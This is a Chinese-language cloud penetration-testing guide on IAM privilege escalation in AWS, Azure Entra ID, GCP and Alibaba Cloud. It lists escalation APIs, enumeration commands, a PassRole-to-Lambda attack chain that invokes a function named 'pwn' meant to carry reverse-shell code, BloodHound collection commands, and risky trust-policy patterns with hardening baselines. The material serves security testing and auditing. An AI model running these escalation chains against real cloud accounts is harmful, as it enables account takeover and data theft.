## 二、IAM 深度攻击与权限提升

### 2.1 AWS IAM 攻击面总览

**AK/SK泄露利用：**
```bash
# 枚举当前身份与权限
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123:user/user --action-names "*"

# 权限提升关键API
# iam:CreateAccessKey → 接管其他用户
# iam:CreateLoginProfile / UpdateLoginProfile → 重置他人密码
# iam:PutUserPolicy / AttachUserPolicy → 自授管理员
# iam:AddUserToGroup → 加入高权限组
# sts:AssumeRole → 角色扮演提权
# lambda:CreateFunction + lambda:InvokeFunction → Lambda代码执行
# ec2:RunInstances + iam:PassRole → 创建带高权限角色的实例
```

**Rhino Security Labs 记录的 21 种 AWS IAM 提权路径中最高危的 5 种（2025-2026实战统计）：**
```
1. iam:CreatePolicyVersion → 创建新策略版本（AdministratorAccess）覆盖原策略
2. iam:SetDefaultPolicyVersion → 切换默认版本到宽松旧版
3. iam:PassRole（配合 lambda:CreateFunction / ec2:RunInstances / cloudformation:CreateStack）
4. iam:AttachUserPolicy / PutUserPolicy / PutRolePolicy
5. sts:AssumeRole（配合宽松信任策略）
```

### 2.2 策略混淆代理（PassRole 滥用）

**PassRole 是"代理攻击"的经典代表：** 拥有 `iam:PassRole` 即可把高权限角色的身份"代理"给另一个服务执行，即使自己无权限直接使用该角色权限。

```bash
# 攻击链：低权限用户 + iam:PassRole + lambda:CreateFunction
# 1. 编写反弹Shell代码
# 2. 创建Lambda函数并PassRole给高权限角色
aws lambda create-function --function-name pwn \
  --runtime python3.12 --role arn:aws:iam::123456789012:role/AdminRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip
# 3. 调用函数执行
aws lambda invoke --function-name pwn out.json
# 4. 此时你的Lambda代码运行在AdminRole身份下

# 其他 PassRole 载体
# ec2:RunInstances + PassRole → 启动带高权限角色实例，SSH进入后取临时凭据
# cloudformation:CreateStack + PassRole → CFN模板中用户数据执行命令
# ecs:RegisterTaskDefinition + PassRole → 恶意任务定义
# sagemaker:CreateNotebookInstance + PassRole
```

### 2.3 受管策略滥用与信任边界绕过

- **AWS受管策略直接附加**：`arn:aws:iam::aws:policy/AdministratorAccess` 被错误附加到开发账号/CI角色
- **AWS Organizations 信任单向性**：管理账号可对成员账号执行 `sts:AssumeRoot` 接管root访问，绕过成员账号管理员配置的防护；攻击者拿到管理账号即拿到所有成员账号
- **服务链接角色**：`iam:CreateServiceLinkedRole` 可创建 `lex.amazonaws.com` 等服务角色，配合 PassRole 扩大攻击面
- **标签/会话标签边界**：`aws:RequestTag`、`aws:PrincipalTag` 条件使用不当导致的越权

### 2.4 信任策略攻击（OIDC/联邦/条件误评估）

**信任策略是真正的访问控制平面**——2026年披露的 IAM 条件误评估问题（CVE-2026-1238 类）表明"看似安全"的信任策略在 IAM 求值语义下行为完全不同：

```json
// 危险模式1：StringEqualsIfExists——键不存在时条件不生效
{
  "Condition": {"StringEqualsIfExists": {"aws:SourceIdentity": "approved-session"}}
}
// 攻击者不传 SourceIdentity 即可绕过 → 应改用 StringEquals

// 危险模式2：通配 Principal
{"Principal": {"AWS": "*"}}               // 任意账号任意身份可Assume
{"Principal": {"AWS": "arn:aws:iam::123456789012:root"}}  // 账号内所有身份

// 危险模式3：OIDC 联邦信任策略过宽（2025-2026最高频漏洞）
// GitHub Actions OIDC 信任：sub/aud 未精确限定仓库与分支
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {"StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"}}
  }]
}
// 缺陷：sub 未限定为 repo:owner/repo:ref:refs/heads/main → 任意仓库/分支的Actions可Assume
// UNC6426 真实链：恶意npm包偷GitHub token → 滥用GitHub→AWS OIDC信任 → 创建管理员角色 → S3数据窃取
```

**OIDC 信任策略加固基线（审计重点）：**
- `token.actions.githubusercontent.com:sub` 必须精确匹配 `repo:org/repo:ref:refs/heads/main`
- `aud` 限定为具体角色ARN而非 `sts.amazonaws.com`
- 检查 GitHub Actions 工作流 `permissions` 最小化声明
- 2025年6月起AWS已对新建易受攻击角色设护栏，但存量角色仍可利用

### 2.5 Azure Entra ID（原 Azure AD）攻击

```bash
# Service Principal 滥用
az ad sp list --all --query "[?appDisplayName=='target']"
az login --service-principal -u APP_ID -p SECRET --tenant TENANT_ID

# 权限提升高危权限
# Application.ReadWrite.All → 修改应用凭据/权限
# RoleManagement.ReadWrite.Directory → 提升目录角色（提权到Global Admin）
# AppRoleAssignment.ReadWrite.All → 分配应用角色
# ConditionalAccess 污染 → 修改条件访问策略放行攻击者
# 创建隐蔽 Service Principal 作为持久化（2025年APT29等组织高频手法）

# 借助 AzureHound/BloodHound 绘制 Azure 提权图
bloodhound-python -u <EMAIL-REDACTED> -p pass -c All -d corp.onmicrosoft.com --collectionMethod Azure
```

### 2.6 GCP IAM 攻击
```bash
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list --project=PROJECT_ID
gcloud auth activate-service-account --key-file=key.json

# 提权路径
# iam.serviceAccounts.actAs → 模拟服务账号（配合云函数/计算实例）
# iam.serviceAccountKeys.create → 为高权限SA创建密钥
# iam.roles.update → 修改自定义角色权限
# 计算实例元数据 → 元数据服务器令牌窃取
# GCP "Workload Identity Federation" 配置过宽（类AWS OIDC问题）
```

### 2.7 阿里云 RAM 攻击
```bash
# 枚举
aliyun ram ListUsers
aliyun ram ListAccessKeys --UserName <user>
aliyun sts GetCallerIdentity

# 提权路径
# ram:CreateAccessKey → 创建他人AK
# ram:AttachPolicyToUser / AttachPolicyToRole → 附加高权限策略（AliyunRAMFullAccess等）
# ram:UpdateLoginProfile → 重置密码
# ram:PassRole（配合 ECS/FC/RAM角色）→ 用角色身份执行操作
# ram:SetDefaultPolicyVersion → 切换到宽松版本

# 阿里云主账号 vs RAM子账号：子账号过度授权（AdministratorAccess）是常态问题
# STS临时凭据：ossutil64 配置 STS 后测试权限是否过大
ossutil64 config -e oss-cn-hangzhou.aliyuncs.com -i STS_AK -k STS_SK -t STS_TOKEN
ossutil64 ls oss://your-bucket/
```

